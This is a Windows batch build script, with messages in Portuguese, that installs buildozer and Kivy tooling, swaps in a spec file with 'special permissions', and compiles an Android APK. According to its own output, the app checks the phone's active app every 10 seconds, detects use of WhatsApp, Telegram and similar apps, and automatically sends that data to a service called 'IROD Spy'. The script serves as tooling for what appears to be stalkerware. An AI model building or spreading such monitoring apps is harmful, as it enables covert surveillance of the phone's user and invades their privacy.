@echo off
echo ========================================
echo   BUILD COM MONITORAMENTO SOCIAL
echo ========================================

echo Instalando dependencias...
pip install --user buildozer cython kivy requests plyer

echo.
echo Usando buildozer.spec com permissoes especiais...
copy buildozer-social.spec buildozer.spec

echo.
echo Gerando APK com monitoramento de redes sociais...
echo IMPORTANTE: Este APK ira:
echo - Monitorar apps ativos a cada 10 segundos
echo - Detectar uso de WhatsApp, Telegram, etc
echo - Enviar dados para IROD Spy automaticamente
echo.

"%APPDATA%\Python\Python313\Scripts\buildozer.exe" android debug

if %errorlevel% equ 0 (
    echo.
    echo ========================================
    echo ✓ APK COM MONITORAMENTO GERADO!
    echo ========================================
    echo.
    echo FUNCIONALIDADES:
    echo ✓ Captura uso de redes sociais
    echo ✓ Monitora a cada 10 segundos
    echo ✓ Envia dados automaticamente
    echo ✓ Mostra app ativo na tela
    echo.
    echo Arquivo: bin\*.apk
) else (
    echo.
    echo ✗ ERRO NO BUILD
)

pause